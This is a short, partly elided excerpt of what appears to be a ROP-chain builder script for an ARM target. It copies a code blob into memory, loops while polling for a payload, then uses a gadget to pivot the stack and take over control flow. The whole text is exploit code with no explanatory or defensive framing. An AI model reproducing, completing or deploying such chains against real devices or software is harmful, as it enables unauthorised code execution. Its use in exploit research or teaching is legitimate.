...
memcpy(INITIAL_DST, CODE_PTR, os.path.getsize('../code/code.bin'))
...
put_label("check_loop")

sleep(200*1000)

memcmp(CODE_PTR, PAYLOAD_VA, 0x2000)
compare_r0_0()
store_if_equal(NOP, check_loop_pivot)

pop(r0=check_loop, r1=NOP)
put_label("check_loop_pivot")
add_word(MOV_SPR0_MOV_R0R2_MOV_LRR3_BX_R1)
